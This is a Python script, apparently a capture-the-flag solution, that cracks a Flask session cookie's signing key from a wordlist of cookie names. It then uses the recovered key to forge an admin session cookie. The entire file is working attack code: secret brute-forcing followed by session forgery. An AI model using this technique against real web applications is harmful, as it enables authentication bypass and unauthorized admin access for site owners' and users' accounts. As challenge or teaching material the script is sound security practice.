from .timed import TimestampSigner
from .url_safe import URLSafeTimedSerializer
from flask.json.tag import TaggedJSONSerializer
from hashlib import sha1
from .exc import BadSignature

secret_keys = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
cookie = 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZuFYkQ.eX0ZAXs_69xfrjGw7JzM5UjZGjo'

for secret in secret_keys:
    try:  
       serializer = URLSafeTimedSerializer(
            secret_key=secret,
            salt="cookie-session",
            serializer=TaggedJSONSerializer(),
            signer=TimestampSigner,
            signer_kwargs={
                'key_derivation': 'hmac',
                'digest_method': sha1
            }).loads(cookie)           
    except BadSignature:
        continue

    print(secret)
    shhh = secret
    print('Secret key: {}'.format(secret))

session = {'very_auth': 'admin'}
print(URLSafeTimedSerializer(
    secret_key=shhh,
    salt='cookie-session',
    serializer=TaggedJSONSerializer(),
    signer=TimestampSigner,
    signer_kwargs={
        'key_derivation': 'hmac',
        'digest_method': sha1
    }
).dumps(session))

# as i mentioned before 
#   serializer.loads(signed_value)
#       Purpose: This method is used to verify and deserialize the signed session cookie.

#   serializer.dumps(cookie_value)
#       serializer.dumps(cookie_value)
#       Purpose: This method is used to create a signed session cookie.
